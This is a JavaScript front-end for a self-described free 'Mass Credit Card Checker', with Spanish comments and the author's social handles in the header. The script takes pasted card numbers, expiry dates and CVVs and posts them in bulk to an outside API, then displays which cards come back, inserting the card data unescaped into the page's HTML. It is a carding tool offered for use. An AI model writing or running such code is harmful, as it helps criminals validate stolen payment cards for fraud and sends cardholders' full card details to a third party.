/*
YaelChecker is a totally free Mass Credit Card Checker.
RE-WRITED BY YAEL MASSIEU.
Telegram: @sterytools
Insta: @is.leay
Portfolio: https://yael.pages.dev/
*/

//Ponemos la funcion que nos da la fecha en un DOMContentLoaded
document.addEventListener("DOMContentLoaded", () => {
  setYear();
});
//Seleccionamos los elementos HTML
const btnChecar = document.getElementById("btnChecar");
const textarea = document.getElementById("textarea");
const datosDiv = document.getElementById("datos");
const infos = document.getElementById("infos");
const setYear = () =>
  (document.getElementById("date").textContent = new Date().getFullYear());
//Click del botón
btnChecar.addEventListener("click", async () => {
  const tarjetas = textarea.value.split("\n").map((card) => card.split("|"));
  //Hacemos la solicitud
  try {
    const respuesta = await fetch("https://freeapi.stery.us/api/checarCC", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(tarjetas),
    });
    const datos = await respuesta.json();
    //Limpiamos el textarea y el DIV
    datosDiv.innerHTML = "";
    textarea.value = "";
    let hayProblemas = true;
    //Aquí se manejan los errores.
    if (datos.error) {
      datosDiv.textContent = `Error: ${datos.error}`;
      hayProblemas = false;
    }
    if (hayProblemas) {
      //Si se cumple, mostramos los datos
      console.log(datos);
      for (const detalles in datos) {
        const tarjetas = datos[detalles];
        for (const tarjeta of tarjetas) {
          const resultado = `<p>
            ${detalles}:
            Tarjeta: ${tarjeta.ccNum},
            Mes: ${tarjeta.ccMes},
            Año: ${tarjeta.ccAnio},
            CCV: ${tarjeta.ccCodigo}
            </p>`;
          datosDiv.innerHTML += resultado;
        }
      }
    }
  } catch (error) {
    //cualquier error externo se mostrará en consola y en el HTML.
    console.error(`Error: ${error}`);
    infos.textContent = `ERROR: ${error.message}`;
    hayProblemas = false;
  }
});
